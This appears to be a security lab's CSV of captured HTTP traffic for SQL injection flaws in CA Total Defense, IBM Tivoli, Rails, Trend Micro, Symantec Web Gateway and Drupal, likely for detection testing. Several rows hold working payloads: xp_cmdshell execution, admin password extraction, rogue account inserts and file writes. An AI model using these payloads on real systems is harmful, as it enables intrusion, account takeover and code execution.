XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿TSL20120208-09_CA_Total_Defense_Suite_UNCWS_exportReport_SQL_Injection.xml,CA Total Defense Suite UNCWS exportReport SQL Injection,"An SQL Injection vulnerability exists in CA Total Defense Suite UNC Management Console. The vulnerability is
due to insufficient sanitization of the request parameters in a stored procedure. A remote unauthenticated attacker
can exploit this vulnerability by sending a craft SOAP request to the target on port 34444 for HTTP and 34443 for
HTTPS. Any injected SQL commands will run with DBA privileges.
This vulnerability can be leveraged by a remote unauthenticated attacker to execute arbitrary code on a target
system with SYSTEM privileges by the means of SQL exec function.","HTTP,HTTPS",TCP,"POST /UNCWS/Management.asmx HTTP/1.1||0D 0A ||Host||3A || 192.168.0.67||0D 0A ||Content-Type||3A || text/xml||3B || charset=utf-8||0D 0A ||SOAPAction||3A || ||22 ||http||3A ||//tempuri.org/exportReport||22 0D 0A ||Content-Length||3A || 682||0D 0A 0D 0A ||<?xml version=||22 ||1.0||22 || encoding=||22 ||utf-8||22 ||?>||0A ||<soap||3A ||Envelope xmlns||3A ||xsi=||22 ||http||3A ||//www.w3.org/2001/XMLSchema-instance||22 || xmlns||3A ||xsd=||22 ||http||3A ||//www.w3.org/2001/XMLSchema||22 || xmlns||3A ||soap=||22 ||http||3A ||//schemas.xmlsoap.org/soap/envelope/||22 ||>||0A ||  <soap||3A ||Body>||0A ||    <exportReport xmlns=||22 ||http||3A ||//tempuri.org/||22 ||>||0A ||      <EnterpriseID>0</EnterpriseID>||0A ||      <ReportID>1082</ReportID>||0A ||      <ReportName>ReportName</ReportName>||0A ||      <FormatID>1</FormatID>||0A ||      <GMT>GMT-5</GMT>||0A ||      <generateoptionsxml>xmlstring</generateoptionsxml>||0A ||      <UserID>1</UserID>||0A ||      <SelectedID>1082,11)||3B || exec master.dbo.xp_cmdshell ||22 ||echo PoC>c||3A ||\poc.txt||22 3B ||--</SelectedID>||0A ||      <lang>en</lang>||0A ||    </exportReport>||0A ||  </soap||3A ||Body>||0A ||</soap||3A ||Envelope>"
TSL20120208-09_CA_Total_Defense_Suite_UNCWS_exportReport_SQL_Injection.xml,CA Total Defense Suite UNCWS exportReport SQL Injection,"An SQL Injection vulnerability exists in CA Total Defense Suite UNC Management Console. The vulnerability is
due to insufficient sanitization of the request parameters in a stored procedure. A remote unauthenticated attacker
can exploit this vulnerability by sending a craft SOAP request to the target on port 34444 for HTTP and 34443 for
HTTPS. Any injected SQL commands will run with DBA privileges.
This vulnerability can be leveraged by a remote unauthenticated attacker to execute arbitrary code on a target
system with SYSTEM privileges by the means of SQL exec function.","HTTP,HTTPS",TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Mon, 05 Mar 2012 16||3A ||43||3A ||11 GMT||0D 0A ||Server||3A || Microsoft-IIS/6.0||0D 0A ||X-Powered-By||3A || ASP.NET||0D 0A ||X-AspNet-Version||3A || 2.0.50727||0D 0A ||Cache-Control||3A || private, max-age=0||0D 0A ||Content-Type||3A || text/xml||3B || charset=utf-8||0D 0A ||Content-Length||3A || 367||0D 0A 0D 0A ||<?xml version=||22 ||1.0||22 || encoding=||22 ||utf-8||22 ||?><soap||3A ||Envelope xmlns||3A ||soap=||22 ||http||3A ||//schemas.xmlsoap.org/soap/envelope/||22 || xmlns||3A ||xsi=||22 ||http||3A ||//www.w3.org/2001/XMLSchema-instance||22 || xmlns||3A ||xsd=||22 ||http||3A ||//www.w3.org/2001/XMLSchema||22 ||><soap||3A ||Body><exportReportResponse xmlns=||22 ||http||3A ||//tempuri.org/||22 ||><exportReportResult>SUCCESS</exportReportResult></exportReportResponse></soap||3A ||Body></soap||3A ||Envelope>"
﻿TSL20120301-10_IBM_Tivoli_Provisioning_Manager_Express_Asset_getMimeType_SQL_Injection.xml,IBM Tivoli Provisioning Manager Express Asset.getMimeType SQL Injection,"An SQL injection vulnerability exists in IBM Tivoli Provisioning Manager Express. The vulnerability is due to insufficient input sanitation in the Asset.getMimeType function when processing HTTP requests sent to the getAttachment servlet.            A remote attacker can exploit this SQL injection vulnerability to read data from the database including the SHA1 encrypted admin password, and then upload file to the server and execute code under the context of the SYSTEM user.
",HTTP,TCP,"GET /tpmx/getAttachment?hwKey=1&revesion=1&fileType=ATTACHMENT&fileName=file'%20union%20select%20password%20from%20%24%23SCHEMA.users%20where%20userid='admin HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*||0D 0A ||Accept-Language||3A || en-us||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 8.0||3B || Windows NT 5.1||3B || Trident/4.0||3B || InfoPath.2||3B || .NET CLR 2.0.50727||3B || .NET CLR 3.0.4506.2152||3B || .NET CLR 3.5.30729)||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||Host||3A || 172.16.8.143||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
TSL20120301-10_IBM_Tivoli_Provisioning_Manager_Express_Asset_getMimeType_SQL_Injection.xml,IBM Tivoli Provisioning Manager Express Asset.getMimeType SQL Injection,"An SQL injection vulnerability exists in IBM Tivoli Provisioning Manager Express. The vulnerability is due to insufficient input sanitation in the Asset.getMimeType function when processing HTTP requests sent to the getAttachment servlet.            A remote attacker can exploit this SQL injection vulnerability to read data from the database including the SHA1 encrypted admin password, and then upload file to the server and execute code under the context of the SYSTEM user.
",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Content-Type||3A || 2891baceeef1652ee698294da0e71ba78a2a4064||0D 0A ||Content-Disposition||3A || attachment||3B || filename=file' union select password from $#SCHEMA.users where userid='admin||0D 0A ||Content-Length||3A || 0||0D 0A ||Content-Language||3A || en-US||0D 0A ||Server||3A || WebSphere Application Server/6.0||0D 0A ||Date||3A || Fri, 23 Mar 2012 13||3A ||37||3A ||24 GMT||0D 0A ||Content-Description||3A || Attachment Data||0D 0A 0D 0A||"
﻿TSL20120618-02_Ruby_on_Rails_Where_Hash_SQL_Injection.xml,Ruby on Rails Where Hash SQL Injection,"A vulnerability has been discovered in Ruby on Rails. The vulnerability is due to an improper input validation error while handling hash values. A remote attacker could exploit this vulnerability by sending malicious SQL code as part of the vulnerable parameter via a specially crafted URL, possibly leading to manipulation of data in the database or information disclosure.","HTTP,HTTPS",TCP,"GET /students?id[students[pass]]=57127 HTTP/1.1||0D 0A ||Host||3A || 172.16.8.189||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows NT 5.1||3B || rv||3A ||12.0) Gecko/20100101 Firefox/12.0||0D 0A ||Accept||3A || text/html,application/xhtml+xml,application/xml||3B ||q=0.9,*/*||3B ||q=0.8||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
TSL20120618-02_Ruby_on_Rails_Where_Hash_SQL_Injection.xml,Ruby on Rails Where Hash SQL Injection,"A vulnerability has been discovered in Ruby on Rails. The vulnerability is due to an improper input validation error while handling hash values. A remote attacker could exploit this vulnerability by sending malicious SQL code as part of the vulnerable parameter via a specially crafted URL, possibly leading to manipulation of data in the database or information disclosure.","HTTP,HTTPS",TCP,"GET /assets/application.css?body=1 HTTP/1.1||0D 0A ||Host||3A || 172.16.8.189||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows NT 5.1||3B || rv||3A ||12.0) Gecko/20100101 Firefox/12.0||0D 0A ||Accept||3A || text/css,*/*||3B ||q=0.1||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||Connection||3A || keep-alive||0D 0A ||Referer||3A || http||3A ||//172.16.8.189/students?id[students[pass]]=57127||0D 0A ||Cookie||3A || _blog_session=BAh7ByIQX2NzcmZfdG9rZW4iMXcyRzRRckdwZFNvTTczVmloem1icldiUldiNjY0UjF2S3lKbkR3SG10cWc9Ig9zZXNzaW9uX2lkIiVmZGY3ZDMzYzUyYzA5NzgxODdmOTUwNmM5NmE2OGE5Nw%3D%3D--f808734f5e4a76bc07cf853642ca3c675849ee0f||0D 0A ||If-Modified-Since||3A || Fri, 08 Jun 2012 19||3A ||24||3A ||19 GMT||0D 0A ||If-None-Match||3A || ||22 ||fcd81de9e294f02bc428a5cf059d014a||22 0D 0A 0D 0A||"
TSL20120618-02_Ruby_on_Rails_Where_Hash_SQL_Injection.xml,Ruby on Rails Where Hash SQL Injection,"A vulnerability has been discovered in Ruby on Rails. The vulnerability is due to an improper input validation error while handling hash values. A remote attacker could exploit this vulnerability by sending malicious SQL code as part of the vulnerable parameter via a specially crafted URL, possibly leading to manipulation of data in the database or information disclosure.","HTTP,HTTPS",TCP,"GET /assets/jquery_ujs.js?body=1 HTTP/1.1||0D 0A ||Host||3A || 172.16.8.189||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows NT 5.1||3B || rv||3A ||12.0) Gecko/20100101 Firefox/12.0||0D 0A ||Accept||3A || */*||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||Connection||3A || keep-alive||0D 0A ||Referer||3A || http||3A ||//172.16.8.189/students?id[students[pass]]=57127||0D 0A ||Cookie||3A || _blog_session=BAh7ByIQX2NzcmZfdG9rZW4iMXcyRzRRckdwZFNvTTczVmloem1icldiUldiNjY0UjF2S3lKbkR3SG10cWc9Ig9zZXNzaW9uX2lkIiVmZGY3ZDMzYzUyYzA5NzgxODdmOTUwNmM5NmE2OGE5Nw%3D%3D--f808734f5e4a76bc07cf853642ca3c675849ee0f||0D 0A ||If-Modified-Since||3A || Fri, 08 Jun 2012 19||3A ||01||3A ||52 GMT||0D 0A ||If-None-Match||3A || ||22 ||0ff3e5680ead3dadeee021c144835311||22 0D 0A 0D 0A||"
TSL20120618-02_Ruby_on_Rails_Where_Hash_SQL_Injection.xml,Ruby on Rails Where Hash SQL Injection,"A vulnerability has been discovered in Ruby on Rails. The vulnerability is due to an improper input validation error while handling hash values. A remote attacker could exploit this vulnerability by sending malicious SQL code as part of the vulnerable parameter via a specially crafted URL, possibly leading to manipulation of data in the database or information disclosure.","HTTP,HTTPS",TCP,"HTTP/1.1 200 OK ||0D 0A ||Cache-Control||3A || max-age=0, private, must-revalidate||0D 0A ||Server||3A || WEBrick/1.3.1 (Ruby/1.8.7/2011-06-30)||0D 0A ||Date||3A || Thu, 14 Jun 2012 13||3A ||12||3A ||55 GMT||0D 0A ||Content-Length||3A || 1434||0D 0A ||X-Runtime||3A || 0.025646||0D 0A ||Content-Type||3A || text/html||3B || charset=utf-8||0D 0A ||X-Ua-Compatible||3A || IE=Edge||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||X-Request-Id||3A || 24a35b75e4eae39a8c65dfa402679325||0D 0A ||Etag||3A || ||22 ||d0394d5b0bd50fa8a07b437aa312de1b||22 0D 0A ||Set-Cookie||3A || _blog_session=BAh7ByIQX2NzcmZfdG9rZW4iMXcyRzRRckdwZFNvTTczVmloem1icldiUldiNjY0UjF2S3lKbkR3SG10cWc9Ig9zZXNzaW9uX2lkIiVmZGY3ZDMzYzUyYzA5NzgxODdmOTUwNmM5NmE2OGE5Nw%3D%3D--f808734f5e4a76bc07cf853642ca3c675849ee0f||3B || path=/||3B || HttpOnly||0D 0A 0D 0A ||<!DOCTYPE html>||0A ||<html>||0A ||<head>||0A ||  <title>Blog</title>||0A ||  <link href=||22 ||/assets/application.css?body=1||22 || media=||22 ||all||22 || rel=||22 ||stylesheet||22 || type=||22 ||text/css||22 || />||0A ||<link href=||22 ||/assets/home.css?body=1||22 || media=||22 ||all||22 || rel=||22 ||stylesheet||22 || type=||22 ||text/css||22 || />||0A ||<link href=||22 ||/assets/scaffolds.css?body=1||22 || media=||22 ||all||22 || rel=||22 ||stylesheet||22 || type=||22 ||text/css||22 || />||0A ||<link href=||22 ||/assets/students.css?body=1||22 || media=||22 ||all||22 || rel=||22 ||stylesheet||22 || type=||22 ||text/css||22 || />||0A ||  <script src=||22 ||/assets/jquery.js?body=1||22 || type=||22 ||text/javascript||22 ||></script>||0A ||<script src=||22 ||/assets/jquery_ujs.js?body=1||22 || type=||22 ||text/javascript||22 ||></script>||0A ||<script src=||22 ||/assets/home.js?body=1||22 || type=||22 ||text/javascript||22 ||></script>||0A ||<script src=||22 ||/assets/students.js?body=1||22 || type=||22 ||text/javascript||22 ||></script>||0A ||<script src=||22 ||/assets/application.js?body=1||22 || type=||22 ||text/javascript||22 ||></script>||0A ||  <meta content=||22 ||authenticity_token||22 || name=||22 ||csrf-param||22 || />||0A ||<meta content=||22 ||w2G4QrGpdSoM73VihzmbrWbRWb664R1vKyJnDwHmtqg=||22 || name=||22 ||csrf-token||22 || />||0A ||</head>||0A ||<body>||0A 0A ||<h1>Listing students</h1>||0A 0A ||<table>||0A ||  <tr>||0A ||    <th>Id</th>||0A ||    <th>Name</th>||0A ||    <th>Pass</th>||0A ||    <th></th>||0A ||    <th></th>||0A ||    <th></th>||0A ||  </tr>||0A 0A ||  <tr>||0A ||    <td>2</td>||0A ||    <td>Mercedes</td>||0A ||    <td>57127</td>||0A ||    <td><a href=||22 ||/students/2||22 ||>Show</a></td>||0A ||    <td><a href=||22 ||/students/2/edit||22 ||>Edit</a></td>||0A ||    <td><a href=||22 ||/students/2||22 || data-confirm=||22 ||Are you sure?||22 || data-method=||22 ||delete||22 || rel=||22 ||nofollow||22 ||>Destroy</a></td>||0A ||  </tr>||0A ||</table>||0A 0A ||<br />||0A 0A ||<a href=||22 ||/students/new||22 ||>New Student</a>||0A 0A 0A ||</body>||0A ||</html>||0A||"
TSL20120618-02_Ruby_on_Rails_Where_Hash_SQL_Injection.xml,Ruby on Rails Where Hash SQL Injection,"A vulnerability has been discovered in Ruby on Rails. The vulnerability is due to an improper input validation error while handling hash values. A remote attacker could exploit this vulnerability by sending malicious SQL code as part of the vulnerable parameter via a specially crafted URL, possibly leading to manipulation of data in the database or information disclosure.","HTTP,HTTPS",TCP,"HTTP/1.1 304 Not Modified ||0D 0A ||Cache-Control||3A || no-cache||0D 0A ||Server||3A || WEBrick/1.3.1 (Ruby/1.8.7/2011-06-30)||0D 0A ||Date||3A || Thu, 14 Jun 2012 13||3A ||12||3A ||55 GMT||0D 0A ||X-Runtime||3A || 0.011459||0D 0A ||X-Ua-Compatible||3A || IE=Edge||0D 0A ||X-Request-Id||3A || e4dcafe78baab021ef9871dd43bdb9e2||0D 0A 0D 0A||"
TSL20120618-02_Ruby_on_Rails_Where_Hash_SQL_Injection.xml,Ruby on Rails Where Hash SQL Injection,"A vulnerability has been discovered in Ruby on Rails. The vulnerability is due to an improper input validation error while handling hash values. A remote attacker could exploit this vulnerability by sending malicious SQL code as part of the vulnerable parameter via a specially crafted URL, possibly leading to manipulation of data in the database or information disclosure.","HTTP,HTTPS",TCP,"HTTP/1.1 304 Not Modified ||0D 0A ||Cache-Control||3A || no-cache||0D 0A ||Server||3A || WEBrick/1.3.1 (Ruby/1.8.7/2011-06-30)||0D 0A ||Date||3A || Thu, 14 Jun 2012 13||3A ||12||3A ||55 GMT||0D 0A ||X-Runtime||3A || 0.004207||0D 0A ||X-Ua-Compatible||3A || IE=Edge||0D 0A ||X-Request-Id||3A || 235bb82b4e932d32a319c51d0e042282||0D 0A 0D 0A||"
﻿TSL20120928-04_Trend_Micro_Control_Manager_ad_hoc_query_Module_SQL_Injection.xml,Trend Micro Control Manager ad hoc query Module SQL Injection,"An SQL injection vulnerability exists in Trend Micro Control Manager. The vulnerability is due to insufficient input validation on user queries by the ad hoc query module. A remote, authenticated attacker could exploit this vulnerability by sending crafted parameter in the GET request for AdHocQuery_Processor.aspx page. A successful exploitation attempt could result in the execution of SQL commands under the context of the SYSTEM user.","HTTP,HTTPS",TCP,GET /webapp/AdHocQuery/AdHocQuery_Processor.aspx?Action=View&asc=true&Sort=7&paging=10&id=350b651c-15c5-45ca-8d64-33b20f3fc4d8%27INSERT%20INTO%20db_ControlManager.dbo.tb_UserInfo%20%28UserGuid%2C%20%5BPassword%5D%2C%20MailAddress%29%20VALUES%20%28%27aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa%27%2C%20%27TELUSSecurityLabs%27%2C%20%27poc%40tsl.com%27%29-- HTTP/1.1||0D 0A ||User-agent||3A || User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 8.0||3B || Windows NT 5.1||3B ||)||0D 0A ||Accept-Encoding||3A || identity||0D 0A ||Host||3A || 172.16.8.147||0D 0A ||Cookie||3A || ASP.NET_SessionId=gggsj1ztvp2cpo45jeukshnq||3B || .ASPXAUTH=3ED9DD19995D0B248DFA0638D0F469D43DC598BF46526C3DA9E02931D28C34A81C1173C570CCDDE906E0A7FD91C7E264F0E1BE4AABBE370C3CE48D1DE469FCA6B51902E904DFA2111EB598DC159A8430B76735D4432276499122AD6F2344A5E1059FDCCC||3B || WFINFOR=root||0D 0A ||Connection||3A || close||0D 0A 0D 0A||
TSL20120928-04_Trend_Micro_Control_Manager_ad_hoc_query_Module_SQL_Injection.xml,Trend Micro Control Manager ad hoc query Module SQL Injection,"An SQL injection vulnerability exists in Trend Micro Control Manager. The vulnerability is due to insufficient input validation on user queries by the ad hoc query module. A remote, authenticated attacker could exploit this vulnerability by sending crafted parameter in the GET request for AdHocQuery_Processor.aspx page. A successful exploitation attempt could result in the execution of SQL commands under the context of the SYSTEM user.","HTTP,HTTPS",TCP,"HTTP/1.1 200 OK||0D 0A ||Cache-Control||3A || private||0D 0A ||Transfer-Encoding||3A || chunked||0D 0A ||Content-Type||3A || text/html||3B || charset=utf-8||0D 0A ||Server||3A || Microsoft-IIS/7.0||0D 0A ||X-AspNet-Version||3A || 2.0.50727||0D 0A ||X-UA-Compatible||3A || IE=EmulateIE7||0D 0A ||Date||3A || Thu, 15 Dec 2011 19||3A ||51||3A ||01 GMT||0D 0A ||Connection||3A || close||0D 0A 0D 0A ||2a2f||0D 0A 0D 0A 0D 0A ||<!DOCTYPE html PUBLIC ||22 ||-//W3C//DTD XHTML 1.0 Transitional//EN||22 || ||22 ||http||3A ||//www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd||22 ||>||0D 0A 0D 0A ||<html xmlns=||22 ||http||3A ||//www.w3.org/1999/xhtml||22 || >||0D 0A ||<head><title>||0D 0A 09 ||Untitled Page||0D 0A ||</title><link rel=||22 ||stylesheet||22 || type=||22 ||text/css||22 || href=||22 ||../css/trend-style.css||22 || />||0D 0A ||    <script language=||22 ||javascript||22 || type=||22 ||text/javascript||22 ||>||0D 0A ||    function expandDetail()||0D 0A ||    {||0D 0A ||       var obj = document.getElementById('ExceptionDetail')||3B 0D 0A ||       var img = document.getElementById('expand_icon')||3B 0D 0A ||       if(obj.style.display == 'none')||0D 0A ||       {||0D 0A ||            obj.style.display = 'block'||3B 0D 0A ||            img.src='../images/expand_plus.gif'||3B 0D 0A ||       } ||0D 0A ||       else||0D 0A ||       {||0D 0A ||            obj.style.display = 'none'||3B 0D 0A ||            img.src='../images/expand_minus.gif'||3B 0D 0A ||        } ||0D 0A ||    }||0D 0A ||    </script>||0D 0A ||</head>||0D 0A ||<body>||0D 0A ||    <form name=||22 ||form1||22 || method=||22 ||post||22 || action=||22 ||/webapp/ExceptionPages/ErrorPage.aspx?Action=View&amp||3B ||asc=true&amp||3B ||Sort=7&amp||3B ||paging=10&amp||3B ||id=350b651c-15c5-45ca-8d64-33b20f3fc4d8'INSERT+INTO+db_ControlManager.dbo.tb_UserInfo+(UserGuid%2c+%5bPassword%5d%2c+MailAddress)+VALUES+('aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'%2c+'TELUSSecurityLabs'%2c+'poc%40tsl.com')--||22 || id=||22 ||form1||22 ||>||0D 0A ||<input type=||22 ||hidden||22 || name=||22 ||__VIEWSTATE||22 || id=||22 ||__VIEWSTATE||22 || value=||22 ||/wEPDwUJMjc4OTc0MDA1D2QWAgIDD2QWDgIBDw8WAh4EVGV4dAUcRGF0YWJhc2UgY29ubmVjdGlvbiBmYWlsdXJlLmRkAgMPDxYCHwAFGURhdGFiYXNlIGlzIGRpc2Nvbm5lY3RlZC5kZAIFDw8WAh8ABSZQbGVhc2UgY2hlY2sgeW91ciBkYXRhYmFzZSBjb25uZWN0aW9uLmRkAggPDxYCHwAFX1Byb2NlZHVyZSBvciBmdW5jdGlvbiAnc3BfSXNTYXZlZEN1c3RvbVZpZXcnIGV4cGVjdHMgcGFyYW1ldGVyICdAVHlwZScsIHdoaWNoIHdhcyBub3Qgc3VwcGxpZWQuZGQCCg8PFgIfAAUiU3lzdGVtLkRhdGEuU3FsQ2xpZW50LlNxbEV4Y2VwdGlvbmRkAgwPDxYCHwAFHC5OZXQgU3FsQ2xpZW50IERhdGEgUHJvdmlkZXJkZAIODw8WAh8ABcQVICAgYXQgU3lzdGVtLkRhdGEuU3FsQ2xpZW50LlNxbENvbm5lY3Rpb24uT25FcnJvcihTcWxFeGNlcHRpb24gZXhjZXB0aW9uLCBCb29sZWFuIGJyZWFrQ29ubmVjdGlvbikNCiAgIGF0IFN5c3RlbS5EYXRhLlNxbENsaWVudC5TcWxJbnRlcm5hbENvbm5lY3Rpb24uT25FcnJvcihTcWxFeGNlcHRpb24gZXhjZXB0aW9uLCBCb29sZWFuIGJyZWFrQ29ubmVjdGlvbikNCiAgIGF0IFN5c3RlbS5EYXRhLlNxbENsaWVudC5UZHNQYXJzZXIuVGhyb3dFeGNlcHRpb25BbmRXYXJuaW5nKFRkc1BhcnNlclN0YXRlT2JqZWN0IHN0YXRlT2JqKQ0KICAgYXQgU3lzdGVtLkRhdGEuU3FsQ2xpZW50LlRkc1BhcnNlci5SdW4oUnVuQmVoYXZpb3IgcnVuQmVoYXZpb3IsIFNxbENvbW1hbmQgY21kSGFuZGxlciwgU3FsRGF0YVJlYWRlciBkYXRhU3RyZWFtLCBCdWxrQ29weVNpbXBsZVJlc3VsdFNldCBidWxrQ29weUhhbmRsZXIsIFRkc1BhcnNlclN0YXRlT2JqZWN0IHN0YXRlT2JqKQ0KICAgYXQgU3lzdGVtLkRhdGEuU3FsQ2xpZW50LlNxbERhdGFSZWFkZXIuQ29uc3VtZU1ldGFEYXRhKCkNCiAgIGF0IFN5c3RlbS5EYXRhLlNxbENsaWVudC5TcWxEYXRhUmVhZGVyLmdldF9NZXRhRGF0YSgpDQogICBhdCBTeXN0ZW0uRGF0YS5TcWxDbGllbnQuU3FsQ29tbWFuZC5GaW5pc2hFeGVjdXRlUmVhZGVyKFNxb"
﻿TSL20140618-14_Symantec_Web_Gateway_dbutils.php_SQL_Injection.xml,Symantec Web Gateway dbutils.php SQL Injection,"An SQL injection vulnerability exists in Symantec Web Gateway. The vulnerability is due to lack of proper sanitization of the &quot;hostname&quot; HTTP parameter passed to some PHP pages. A remote, authenticated attacker could exploit this vulnerability by sending a crafted HTTP request to the vulnerable target server. A successful exploitation attempt could result in the execution of SQL commands, leading to information disclosure, corruption of the database, a denial-of-service condition, corruption of the database, and possibly other effects.",HTTP/HTTPS,TCP,"GET /spywall/clientreport.php?hostname=telus%27%20or%20%27%27%20=%20(select%20%27hello%27%20into%20outfile%20%27telussecuritylabs.txt%27)+--+ HTTP/1.1||0D 0A ||Host||3A || 172.16.8.1||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows NT 6.1||3B || rv||3A ||18.0) Gecko/20100101 Firefox/18.0||0D 0A ||Accept||3A || text/html,application/xhtml+xml,application/xml||3B ||q=0.9,*/*||3B ||q=0.8||0D 0A ||Accept-Language||3A || en-US,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||Cookie||3A || PHPSESSID=4d9bb68e11225aae4625654c77de3c40||0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
﻿TSL20141016-03_Drupal_Core_database_inc_expandArguments_SQL_Injection.xml,Drupal Core database.inc expandArguments SQL Injection,"A SQL injection vulnerability has been found in Drupal Core. The vulnerability is due to insufficient validation of user-supplied data when expanding argument values used in SQL queries. A remote, unauthenticated attacker can exploit this vulnerability by sending a specially crafted parameter to a Drupal Core server. Successful exploitation could lead to arbitrary code execution under the security context of the server.",HTTP/HTTPS,TCP,"POST / HTTP/1.1||0D 0A ||Host||3A || localhost||0D 0A ||User-Agent||3A || TELUS-Security-Labs||0D 0A ||Accept||3A || */*||0D 0A ||Content-Type||3A || application/x-www-form-urlencoded||0D 0A ||Content-Length||3A ||242||0D 0A 0D 0A ||name[0%20||3B ||insert+into+users+(status,uid,name,pass)+SELECT+1,+MAX(uid)%2B1,'TSL','$S$CTo9G7Lx2hYk7HR2nqZxI2trvUXkVW7dge8HcvFXaCYxUpHY.xcW'+FROM+users||3B 3B ||#%20%20]=ignore&name[0]=ignore&pass=ignore&form_build_id=&form_id=user_login_block&op=Log+in"
